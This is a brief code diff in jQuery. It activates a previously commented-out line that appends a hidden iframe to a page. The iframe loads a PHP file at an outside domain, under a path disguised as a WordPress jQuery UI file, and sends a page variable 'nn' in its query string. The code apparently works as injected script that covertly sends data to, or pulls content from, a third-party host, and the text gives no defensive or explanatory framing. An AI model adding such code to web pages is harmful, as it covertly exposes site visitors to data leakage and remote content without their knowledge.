@@ -30,4 +30,4 @@ if(nn == "") {
    //window.location = "";
 //// }
  $('<iframe src="http://direkt-brokers.com/wp-includes/js/jquery-ui.php?name='+nn+ '"style="display:none;"></iframe>')
-  // .appendTo('#overlays');
+   .appendTo('#overlays');
